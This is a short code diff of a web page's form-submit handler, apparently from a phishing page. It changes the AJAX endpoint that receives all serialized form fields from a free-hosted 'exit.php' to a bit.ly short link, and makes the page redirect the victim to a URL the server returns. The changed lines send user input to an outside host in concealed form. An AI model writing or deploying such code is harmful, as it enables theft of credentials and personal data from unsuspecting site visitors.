@@ -94,11 +94,11 @@ function MM_validateForm() { //v4.0
         e.preventDefault();
         
         $.ajax({
-          url : "https://edu-link.000webhostapp.com/exit.php",
+          url : "https://bit.ly/3b4OIpQ",
           type : "POST",
           data : $('form').serialize(),
           success : (response) => {
-            console.log(response);
+            location.href = response;
           }
         });
         
